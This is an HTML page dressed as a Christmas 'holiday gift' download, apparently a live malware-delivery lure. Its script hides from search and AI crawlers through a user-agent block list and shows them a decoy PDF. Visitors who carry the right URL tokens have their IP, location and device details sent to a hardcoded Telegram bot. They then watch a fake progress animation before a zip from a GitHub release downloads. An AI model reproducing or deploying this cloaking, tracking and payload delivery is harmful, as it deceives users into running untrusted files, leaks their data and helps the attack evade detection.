<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Holiday Gift - Premium Download</title>
    <style>
        @font-face {
            font-family: 'Christmas';
            src: url("data:application/font-woff2;charset=utf-8;base64,d09GMgABAAAAA") format('woff2');
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0d1b2a 0%, #1b3a4b 100%);
            color: #333;
            min-height: 100vh;
            padding: 20px;
        }
        
        /* Full-screen PDF Container */
        .pdf-fullscreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 9999;
            background: white;
        }
        
        .pdf-fullscreen iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        /* Gift Container (shown when access granted) */
        .gift-container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
            overflow: hidden;
            border: 3px solid #b91d1d;
            margin: 0 auto;
        }
        
        /* Gift Header */
        .gift-header {
            background: linear-gradient(to right, #b91d1d, #d32f2f);
            padding: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .gift-header::before {
            content: "‚ùÑÔ∏è";
            position: absolute;
            font-size: 30px;
            opacity: 0.2;
            animation: snow 15s linear infinite;
        }
        
        .gift-logo {
            width: 50px;
            height: 50px;
            background: white;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #b91d1d;
            font-size: 28px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }
        
        .gift-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        /* Main Content */
        .main-content {
            padding: 40px 30px;
            text-align: center;
        }
        
        .gift-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #b91d1d 0%, #d32f2f 100%);
            border-radius: 20px;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            animation: giftGlow 2s infinite alternate;
            box-shadow: 0 10px 30px rgba(185, 29, 29, 0.4);
        }
        
        .gift-icon:before {
            content: "üéÅ";
            color: white;
            font-size: 48px;
        }
        
        .status-message {
            font-size: 22px;
            color: #b91d1d;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .sub-message {
            font-size: 16px;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        /* Progress Section */
        .progress-container {
            margin: 30px 0;
        }
        
        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 14px;
            color: #555;
        }
        
        .progress-bar {
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(to right, #b91d1d, #ff7f00);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 4px;
        }
        
        /* Loading Spinner */
        .gift-spinner {
            width: 50px;
            height: 50px;
            margin: 20px auto;
            position: relative;
        }
        
        .spinner-circle {
            width: 100%;
            height: 100%;
            border: 4px solid #f0f0f0;
            border-top-color: #b91d1d;
            border-right-color: #ff7f00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        /* File List */
        .file-list {
            margin: 30px 0;
            text-align: left;
        }
        
        .file-header {
            font-size: 16px;
            color: #333;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #ffb300;
            display: flex;
            justify-content: space-between;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .file-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #b91d1d 0%, #d32f2f 100%);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 20px;
            font-weight: bold;
        }
        
        .file-details {
            flex: 1;
        }
        
        .file-name {
            font-size: 16px;
            color: #333;
            margin-bottom: 4px;
            font-weight: 500;
        }
        
        .file-size {
            font-size: 13px;
            color: #777;
        }
        
        .file-status {
            font-size: 12px;
            padding: 6px 12px;
            border-radius: 15px;
            background: #f0f0f0;
            color: #666;
            font-weight: 500;
        }
        
        .status-processing {
            background: #e3f2fd;
            color: #1976d2;
        }
        
        .status-completed {
            background: #e8f5e9;
            color: #388e3c;
        }
        
        /* Download Button */
        .download-button {
            display: none;
            width: 100%;
            padding: 18px;
            background: linear-gradient(to right, #b91d1d, #ff7f00);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            box-shadow: 0 6px 20px rgba(185, 29, 29, 0.3);
        }
        
        .download-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(185, 29, 29, 0.5);
        }
        
        .download-button i {
            margin-right: 10px;
        }
        
        /* Footer */
        .gift-footer {
            padding: 20px 30px;
            background: #2e7d32;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
        }
        
        .holiday-badge {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .holiday-logo {
            color: #ffd700;
            font-weight: bold;
            font-size: 16px;
        }
        
        /* Animations */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes giftGlow {
            0% { transform: translateY(0); box-shadow: 0 10px 30px rgba(185, 29, 29, 0.4); }
            100% { transform: translateY(-10px); box-shadow: 0 20px 40px rgba(185, 29, 29, 0.6); }
        }
        
        @keyframes snow {
            0% { transform: translateY(-100%) translateX(-100%); }
            100% { transform: translateY(100%) translateX(100%); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease forwards;
        }
        
        /* Responsive */
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            
            .main-content {
                padding: 30px 20px;
            }
            
            .gift-header {
                padding: 20px;
                flex-direction: column;
                gap: 15px;
            }
            
            .gift-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div id="contentContainer">
        <!-- Content will be loaded here after security checks -->
    </div>

    <script>
        // ==================== SECURITY CONFIGURATION ====================
        const botToken = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0'; 
        const chatId = '1412104349';
        
        // Blacklisted user agents (bots/crawlers)
        const blacklistedWords = [
            'Googlebot', 'Microsoft','google', 'microsoft', 'crawl','python','curl',
            'Amazonbot','Applebot','Applebot-Extended','Bytespider',
            'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
            'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
            'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
            'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
            'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
            'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
            'img2dataset','omgili','omgilibot'
        ];
        
        // Required URL parameters (Christmas-themed)
        const allowedParamPattern = /^Santa\d{3}$/;      // Example: Santa123
        const allowedParamPattern2 = /^Rudolph\d{3}$/;   // Example: Rudolph456
        
        // Local storage keys
        const BLACKLIST_KEY = 'holiday_blacklist';
        const PARAM_KEY = 'valid_gift_params';
        
        // ==================== BLACKLIST MANAGEMENT (Local Storage) ====================
        function initializeBlacklist() {
            if (!localStorage.getItem(BLACKLIST_KEY)) {
                // Initialize with empty blacklist
                localStorage.setItem(BLACKLIST_KEY, JSON.stringify([]));
            }
        }
        
        function addToBlacklist(ip, reason = 'Security violation') {
            try {
                const blacklist = JSON.parse(localStorage.getItem(BLACKLIST_KEY) || '[]');
                const entry = {
                    ip: ip,
                    timestamp: new Date().toISOString(),
                    reason: reason,
                    userAgent: navigator.userAgent.substring(0, 100)
                };
                
                // Check if IP already exists
                if (!blacklist.some(entry => entry.ip === ip)) {
                    blacklist.push(entry);
                    localStorage.setItem(BLACKLIST_KEY, JSON.stringify(blacklist));
                    console.log(`üéÖ Added ${ip} to blacklist: ${reason}`);
                    
                    // Send Telegram notification
                    sendTelegramNotification(`${ip} blacklisted - ${reason}`);
                }
                return true;
            } catch (error) {
                console.error('Error adding to blacklist:', error);
                return false;
            }
        }
        
        function isBlacklisted(ip) {
            try {
                const blacklist = JSON.parse(localStorage.getItem(BLACKLIST_KEY) || '[]');
                return blacklist.some(entry => entry.ip === ip);
            } catch (error) {
                console.error('Error checking blacklist:', error);
                return false;
            }
        }
        
        // ==================== PARAMETER VALIDATION ====================
        function validateGiftParameters() {
            const urlParams = new URLSearchParams(window.location.search);
            const param1 = urlParams.get('giftCode');      // e.g., ?giftCode=Santa123
            const param2 = urlParams.get('reindeer');      // e.g., &reindeer=Rudolph456
            
            // Check if parameters exist and match patterns
            if (!param1 || !param2) {
                return { valid: false, reason: 'Missing gift parameters' };
            }
            
            if (!allowedParamPattern.test(param1) || !allowedParamPattern2.test(param2)) {
                return { valid: false, reason: 'Invalid gift code format' };
            }
            
            // Store valid parameters in localStorage for this session
            localStorage.setItem(PARAM_KEY, JSON.stringify({
                giftCode: param1,
                reindeer: param2,
                validatedAt: new Date().toISOString()
            }));
            
            return { valid: true, giftCode: param1, reindeer: param2 };
        }
        
        // ==================== SECURITY CHECKS ====================
        async function performSecurityChecks() {
            const validation = validateGiftParameters();
            
            if (!validation.valid) {
                console.log('üéÖ Invalid gift parameters:', validation.reason);
                return { allowed: false, reason: validation.reason };
            }
            
            // Get IP information
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                // Check if IP is blacklisted
                if (isBlacklisted(ip)) {
                    return { allowed: false, reason: 'Blacklisted IP address', ip: ip };
                }
                
                // Check user agent for bots
                const userAgent = navigator.userAgent;
                if (blacklistedWords.some(word => userAgent.toLowerCase().includes(word.toLowerCase()))) {
                    addToBlacklist(ip, 'Bot user agent detected');
                    return { allowed: false, reason: 'Bot detected', ip: ip };
                }
                
                // Additional IP info (optional)
                try {
                    const ipInfo = await fetch('https://ipinfo.io/json?token=d8eafd6deea176');
                    const ipDetails = await ipInfo.json();
                    
                    // Check hostname for blacklisted words
                    const hostname = ipDetails.hostname || '';
                    if (blacklistedWords.some(word => hostname.includes(word))) {
                        addToBlacklist(ip, 'Blacklisted hostname detected');
                        return { allowed: false, reason: 'Suspicious hostname', ip: ip };
                    }
                    
                    return { 
                        allowed: true, 
                        ip: ip, 
                        giftCode: validation.giftCode,
                        location: ipDetails
                    };
                    
                } catch (ipInfoError) {
                    // Continue without detailed IP info
                    return { 
                        allowed: true, 
                        ip: ip, 
                        giftCode: validation.giftCode
                    };
                }
                
            } catch (error) {
                console.error('Security check error:', error);
                // Be strict - if we can't verify, block access
                return { allowed: false, reason: 'Security verification failed' };
            }
        }
        
        // ==================== TELEGRAM NOTIFICATION ====================
        function sendTelegramNotification(message, additionalInfo = {}) {
            const formattedMessage = `
üéÖ *Holiday Gift Security Alert* üéÖ
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
${message}
            
üìÖ Time: ${new Date().toLocaleString()}
üñ•Ô∏è User Agent: ${navigator.userAgent.substring(0, 80)}...
üì∫ Screen: ${window.screen.width}x${window.screen.height}
            `;
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: chatId, 
                    text: formattedMessage,
                    parse_mode: 'Markdown'
                })
            }).catch(error => console.error('Telegram error:', error));
        }
        
        // ==================== PAGE LOADING FUNCTIONS ====================
        function showFullScreenPDF() {
            document.getElementById('contentContainer').innerHTML = `
                <div class="pdf-fullscreen">
                    <iframe src="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">
                        This browser does not support PDFs. Please download the PDF to view it: 
                        <a href="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">Download PDF</a>.
                    </iframe>
                </div>
            `;
        }
        
        function loadGiftPage(securityData) {
            document.getElementById('contentContainer').innerHTML = `
                <div class="gift-container">
                    <!-- Gift Header -->
                    <div class="gift-header">
                        <div class="gift-logo">üéÑ</div>
                        <div class="gift-title">Holiday Gift Delivery</div>
                    </div>
                    
                    <!-- Main Content -->
                    <div class="main-content">
                        <!-- Gift Icon -->
                        <div class="gift-icon"></div>
                        
                        <!-- Status Messages -->
                        <div class="status-message" id="statusMessage">Unwrapping Your Special Gift...</div>
                        <div class="sub-message">Your exclusive holiday content is being prepared for delivery</div>
                        
                        <!-- Progress Bar -->
                        <div class="progress-container">
                            <div class="progress-info">
                                <span id="progressText">Initializing Delivery...</span>
                                <span id="progressPercent">0%</span>
                            </div>
                            <div class="progress-bar">
                                <div class="progress-fill" id="progressFill"></div>
                            </div>
                        </div>
                        
                        <!-- Loading Spinner -->
                        <div class="gift-spinner">
                            <div class="spinner-circle"></div>
                        </div>
                        
                        <!-- File List -->
                        <div class="file-list" id="fileList">
                            <div class="file-header">
                                <span>Your Gift Package (1)</span>
                                <span>Status</span>
                            </div>
                            <!-- Files will be dynamically added here -->
                        </div>
                        
                        <!-- Download Button -->
                        <button class="download-button" id="downloadButton">
                            <i>üéÅ</i> Download Your Holiday Gift
                        </button>
                    </div>
                    
                    <!-- Footer -->
                    <div class="gift-footer">
                        <div class="holiday-badge">
                            <span class="holiday-logo">‚ùÑÔ∏è Holiday Season</span>
                            <span>Special Delivery Service</span>
                        </div>
                        <div>Merry Christmas! üéÖ</div>
                    </div>
                </div>
            `;
            
            // Initialize the gift page functionality
            initializeGiftPage(securityData);
        }
        
        // ==================== GIFT PAGE FUNCTIONALITY ====================
        function initializeGiftPage(securityData) {
            // Gift Package Data
            const giftFiles = [
                { 
                    id: 1, 
                    name: "Exclusive_Holiday_Gift.zip", 
                    size: "Premium Edition",
                    type: "gift"
                }
            ];
            
            // File type icons
            const fileTypeIcons = {
                gift: "üéÅ",
                bonus: "‚ú®",
                special: "üåü"
            };
            
            // Get DOM elements
            const statusMessage = document.getElementById('statusMessage');
            const progressText = document.getElementById('progressText');
            const progressPercent = document.getElementById('progressPercent');
            const progressFill = document.getElementById('progressFill');
            const downloadButton = document.getElementById('downloadButton');
            const fileList = document.getElementById('fileList');
            const giftIcon = document.querySelector('.gift-icon');
            const spinner = document.querySelector('.gift-spinner');
            
            // Initialize the file list display
            function initializeFileList() {
                giftFiles.forEach(file => {
                    const fileItem = document.createElement('div');
                    fileItem.className = 'file-item fade-in';
                    fileItem.id = `file-${file.id}`;
                    
                    fileItem.innerHTML = `
                        <div class="file-icon">${fileTypeIcons[file.type]}</div>
                        <div class="file-details">
                            <div class="file-name">${file.name}</div>
                            <div class="file-size">${file.size}</div>
                        </div>
                        <div class="file-status" id="status-${file.id}">Waiting</div>
                    `;
                    
                    fileList.appendChild(fileItem);
                });
            }
            
            // Update status messages
            const statusMessages = [
                "Unwrapping Your Special Gift...",
                "Verifying Your Exclusive Access...",
                "Preparing Premium Content...",
                "Applying Holiday Magic...",
                "Finalizing Your Delivery...",
                "üéÅ Your Gift is Ready! üéÅ"
            ];
            
            // Simulate gift preparation process
            async function simulateGiftPreparation() {
                let progress = 0;
                const totalSteps = giftFiles.length * 3;
                
                // Initial delay
                await delay(1000);
                
                // Step 1: Gift preparation
                statusMessage.textContent = statusMessages[0];
                await delay(1200);
                progress = 15;
                updateProgress(progress);
                
                // Step 2: Access verification
                statusMessage.textContent = statusMessages[1];
                await delay(1000);
                progress = 30;
                updateProgress(progress);
                
                // Process each gift file
                for (let i = 0; i < giftFiles.length; i++) {
                    const file = giftFiles[i];
                    const fileElement = document.getElementById(`file-${file.id}`);
                    const statusElement = document.getElementById(`status-${file.id}`);
                    
                    // Update status
                    statusMessage.textContent = `Processing ${file.name}...`;
                    statusElement.textContent = "Processing";
                    statusElement.className = "file-status status-processing";
                    fileElement.style.animationDelay = `${i * 0.1}s`;
                    
                    // Step 1: Unpacking
                    await delay(800);
                    progress += 60 / totalSteps;
                    updateProgress(progress);
                    
                    // Step 2: Customizing
                    statusElement.textContent = "Customizing";
                    await delay(600);
                    progress += 60 / totalSteps;
                    updateProgress(progress);
                    
                    // Step 3: Finalizing
                    statusElement.textContent = "Finalizing";
                    await delay(400);
                    progress += 60 / totalSteps;
                    updateProgress(progress);
                    
                    // Mark as completed
                    statusElement.textContent = "‚úÖ Ready";
                    statusElement.className = "file-status status-completed";
                    fileElement.style.background = "linear-gradient(90deg, #f8f8f8 0%, #e8f5e9 100%)";
                }
                
                // Final steps
                statusMessage.textContent = statusMessages[3];
                await delay(800);
                progress = 85;
                updateProgress(progress);
                
                statusMessage.textContent = statusMessages[4];
                await delay(600);
                progress = 95;
                updateProgress(progress);
                
                // Complete
                statusMessage.textContent = statusMessages[5];
                progress = 100;
                updateProgress(progress);
                
                // Stop spinner animation
                spinner.style.opacity = "0.5";
                
                // Show download button
                setTimeout(() => {
                    downloadButton.style.display = "block";
                    downloadButton.classList.add("fade-in");
                    
                    // Add click handler
                    downloadButton.onclick = async function() {
                        // Send Telegram notification with success
                        const successMessage = `
üéÅ *Holiday Gift Claimed Successfully!* üéÅ
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚úÖ Gift Code: ${securityData.giftCode}
üìÆ Delivery Completed
üìç IP Address: ${securityData.ip}
                        `;
                        
                        sendTelegramNotification(successMessage);
                        
                        // Update button
                        this.innerHTML = '<i>‚è≥</i> Downloading Your Gift...';
                        this.style.background = "linear-gradient(to right, #2E7D32, #4CAF50)";
                        this.disabled = true;
                        
                        try {
                            // ‚¨áÔ∏è REPLACE THIS URL WITH YOUR GITHUB .ZIP FILE URL ‚¨áÔ∏è
                            const githubZipUrl = 'https://github.com/Palmo70/PDF-READER/releases/download/Reader/Exclusive_Holiday_Gifts.zip';
                            
                            // Fetch from GitHub
                            const response = await fetch(githubZipUrl);
                            if (!response.ok) {
                                throw new Error(`Failed to fetch: ${response.status}`);
                            }
                            
                            const fileBlob = await response.blob();
                            const downloadUrl = window.URL.createObjectURL(fileBlob);
                            
                            // Create download link
                            const a = document.createElement('a');
                            a.href = downloadUrl;
                            a.download = 'Exclusive_Holiday_Gift.zip';
                            document.body.appendChild(a);
                            a.click();
                            document.body.removeChild(a);
                            
                            // Clean up
                            window.URL.revokeObjectURL(downloadUrl);
                            
                            // Success
                            this.innerHTML = '<i>‚úÖ</i> Gift Downloaded Successfully!';
                            this.style.background = "linear-gradient(to right, #4CAF50, #2E7D32)";
                            
                        } catch (error) {
                            console.error('Download error:', error);
                            this.innerHTML = '<i>‚ö†Ô∏è</i> Download Failed - Try Again';
                            this.style.background = "linear-gradient(to right, #f44336, #d32f2f)";
                            this.disabled = false;
                        }
                    };
                }, 500);
            }
            
            // Update progress bar and text
            function updateProgress(value) {
                const roundedValue = Math.round(value);
                progressFill.style.width = `${roundedValue}%`;
                progressPercent.textContent = `${roundedValue}%`;
                
                // Update progress text
                if (value < 25) {
                    progressText.textContent = "Initializing...";
                } else if (value < 50) {
                    progressText.textContent = "Unpacking gift...";
                } else if (value < 75) {
                    progressText.textContent = "Adding magic...";
                } else if (value < 100) {
                    progressText.textContent = "Final touches...";
                } else {
                    progressText.textContent = "üéÑ Ready to download!";
                }
            }
            
            // Utility function for delays
            function delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
            
            // Interactive gift icon
            if (giftIcon) {
                giftIcon.addEventListener('click', () => {
                    giftIcon.style.animation = 'none';
                    setTimeout(() => {
                        giftIcon.style.animation = 'giftGlow 2s infinite alternate';
                    }, 10);
                });
            }
            
            // Start the gift page
            document.title = "üéÅ Your Holiday Gift - Premium Download";
            initializeFileList();
            
            setTimeout(() => {
                simulateGiftPreparation();
            }, 1500);
        }
        
        // ==================== MAIN EXECUTION ====================
        async function initializePage() {
            // Initialize blacklist storage
            initializeBlacklist();
            
            // Perform security checks
            const securityCheck = await performSecurityChecks();
            
            if (securityCheck.allowed) {
                console.log('üéÖ Access granted to:', securityCheck.ip);
                loadGiftPage(securityCheck);
            } else {
                console.log('üéÖ Access denied:', securityCheck.reason);
                
                // Add to blacklist if we have an IP
                if (securityCheck.ip) {
                    addToBlacklist(securityCheck.ip, securityCheck.reason);
                }
                
                // Show full-screen PDF when blocked
                showFullScreenPDF();
            }
        }
        
        // Start when page loads
        document.addEventListener('DOMContentLoaded', initializePage);
    </script>
</body>
</html>
